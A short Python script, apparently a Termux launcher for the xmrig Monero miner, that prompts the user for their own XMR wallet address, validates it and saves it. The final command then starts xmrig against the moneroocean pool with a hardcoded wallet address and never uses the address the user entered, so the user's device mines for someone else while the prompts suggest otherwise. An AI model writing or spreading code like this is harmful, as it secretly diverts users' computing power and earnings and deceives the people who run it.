import os
import random
import string
import re
os.system("clear")
logo = """
                     _       
                     (_)      
 __  ___ __ ___  _ __ _  __ _ 
 \ \/ / '_ ` _ \| '__| |/ _` |
  >  <| | | | | | |  | | (_| |
 /_/\_\_| |_| |_|_|  |_|\__, |
                         __/ |
                        |___/
"""

class colors:
    RESET = '\033[0m'
    GREEN = '\033[32m'
    ORANGE = '\033[33m'

def is_valid_xmr_address(address):
    pattern = "^4[0-9ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{94}$"
    return bool(re.match(pattern, address))

def save_address(address):
    with open("xmr_address.txt", "w") as f:
        f.write(address)

def load_address():
    if os.path.exists("xmr_address.txt"):
        with open("xmr_address.txt", "r") as f:
            return f.read().strip()
    else:
        return None

def get_xmr_address():
    saved_address = load_address()
    if saved_address and is_valid_xmr_address(saved_address):
        change_address = input(colors.GREEN + f"Current XMR address: {saved_address}\n\nDo you want to change it? (y/n): " + colors.RESET)
        if change_address.lower() == 'n':
            return saved_address
    valid_address = False
    while not valid_address:
        xmr_address = input(colors.GREEN + "Enter your Monero (XMR) address: " + colors.RESET)
        if is_valid_xmr_address(xmr_address):
            valid_address = True
            save_address(xmr_address)
            return xmr_address
        else:
            print("Invalid address. Please try again.")

print(colors.ORANGE + logo + colors.RESET)

xmr_address = get_xmr_address()

def generate_or_load_usr():
    filename = "usr.txt"
    if os.path.exists(filename):
        with open(filename, "r") as file:
            usr = file.read().strip()
    else:
        usr = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        with open(filename, "w") as file:
            file.write(usr)
    return usr

usr = generate_or_load_usr()
print(usr)
os.system("pwd")
os.system("/data/data/com.termux/files/home/xmrig-installer/xmrig/build/./xmrig --donate-level 0 -o gulf.moneroocean.stream:10128 -u 43PNBtA7MyW3N7tKMRBa8HYfmDqwp7ngZEQjQWk9aYAk1UsmdgEYbbugajEoKdKRLs2SAuy6Bfct3As5wNcVw2xj1vmmhdt -p "+usr+"")
